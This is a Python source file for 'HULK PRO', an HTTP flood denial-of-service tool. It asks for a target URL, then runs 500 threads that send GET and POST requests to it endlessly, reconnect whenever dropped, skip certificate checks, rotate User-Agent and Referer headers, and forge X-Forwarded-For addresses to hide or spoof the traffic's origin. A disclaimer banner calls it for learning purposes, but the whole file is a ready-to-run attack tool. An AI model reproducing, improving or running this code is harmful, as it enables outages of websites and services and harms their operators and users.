#!/usr/bin/env python3
# HULK PRO - HTTP Unbearable Load King (Enhanced Version)
# Features:
# - IP Spoofing
# - User-Agent Rotation
# - Referer Spoofing
# - Protocol Logic (HTTP/HTTPS)
# - Randomized Attack Patterns

import sys
import os
import time
import socket
import random
import threading
import ssl
from urllib.parse import urlparse
from datetime import datetime

# Global configuration
THREAD_COUNT = 500
TIMEOUT = 5
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
]
REFERERS = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.youtube.com/',
    'https://www.bing.com/'
]

# Validate URL and extract domain/IP and port
def validate_target(target):
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target  # Default to http if no scheme provided
    
    try:
        parsed = urlparse(target)
        if not parsed.netloc:
            raise ValueError("Invalid URL")
        
        # Extract domain or IP
        host = parsed.netloc.split(':')[0]
        
        # Extract port if specified
        port = parsed.port
        if port is None:
            port = 443 if parsed.scheme == 'https' else 80
        
        path = parsed.path if parsed.path else '/'
        
        return host, port, parsed.scheme, path
    except Exception as e:
        print(f" ✘ Invalid target: {str(e)}")
        sys.exit(1)

# Generate random IP for spoofing
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Create HTTP request with spoofed headers
def create_http_request(host, path):
    headers = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {random.choice(USER_AGENTS)}",
        f"Referer: {random.choice(REFERERS)}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "Upgrade-Insecure-Requests: 1",
        "Cache-Control: max-age=0",
        "X-Forwarded-For: " + random_ip(),
        "X-Forwarded-Host: " + host,
        "X-Forwarded-Proto: http",
        "X-Requested-With: XMLHttpRequest",
        "\r\n"
    ]
    return "\r\n".join(headers)

# Banner
def show_banner():
    print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King PRO        *
    *          Enhanced Python 3 Version            *
    *          Now with Spoofing & Smart Logic     *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                * 
    *  4. Does HULK suit in villain role, huh?     *
    ************************************************
    ''')

# Attack thread
def attack_thread(target_ip, target_port, is_https, path):
    sock = None
    try:
        if is_https:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(TIMEOUT)
            sock = context.wrap_socket(raw_sock, server_hostname=target_ip)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
        
        sock.connect((target_ip, target_port))
        
        while True:
            try:
                request = create_http_request(target_ip, path)
                sock.send(request.encode())
                
                # Random delay to simulate human behavior
                time.sleep(random.uniform(0.1, 0.5))
                
                # Occasionally send POST requests
                if random.random() < 0.2:
                    post_data = f"POST {path} HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 100\r\n\r\n"
                    post_data += "x" * 100
                    sock.send(post_data.encode())
                
            except socket.error:
                sock.close()
                # Reconnect if connection drops
                if is_https:
                    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    raw_sock.settimeout(TIMEOUT)
                    sock = context.wrap_socket(raw_sock, server_hostname=target_ip)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(TIMEOUT)
                sock.connect((target_ip, target_port))
                
    except Exception as e:
        pass
    finally:
        if sock:
            sock.close()

# Main attack function
def attack(target_ip, target_port, is_https, path):
    print(f" [+] HULK PRO is attacking server {target_ip}:{target_port}")
    print("    That's my secret Cap, I am always angry")
    print(f" [+] Using {THREAD_COUNT} threads with spoofed headers")
    print()
    time.sleep(3)
    
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_thread, args=(target_ip, target_port, is_https, path))
        t.daemon = True
        threads.append(t)
    
    try:
        for t in threads:
            t.start()
            time.sleep(0.1)  # Stagger thread starts
        
        while True:
            time.sleep(1)
            print(f"\r [+] Active threads: {threading.active_count() - 1}", end="")
            sys.stdout.flush()
            
    except KeyboardInterrupt:
        print("\n\n [-] Ctrl+C Detected.........Exiting")
    except Exception as e:
        print(f"\n\n [!] Error: {str(e)}")

# Main function
def main():
    os.system("clear")
    show_banner()
    
    # Get target URL
    target = input(" [+] Enter Target URL (http:// or https://): ").strip()
    target_ip, target_port, scheme, path = validate_target(target)
    is_https = scheme == 'https'
    
    print(f" ✅ Valid target: {target_ip}:{target_port}")
    print(f" [+] Protocol: {'HTTPS' if is_https else 'HTTP'}")
    print(f" [+] Path: {path}")
    print(" [+] Attack screen loading...")
    time.sleep(2)
    
    try:
        attack(target_ip, target_port, is_https, path)
    except Exception as e:
        print(f" [!] Error during attack: {str(e)}")
    
    input("\n Press Enter to exit...")
    os.system("clear")
    print(" [-] Dr. Banner is tired...")

if __name__ == "__main__":
    main()
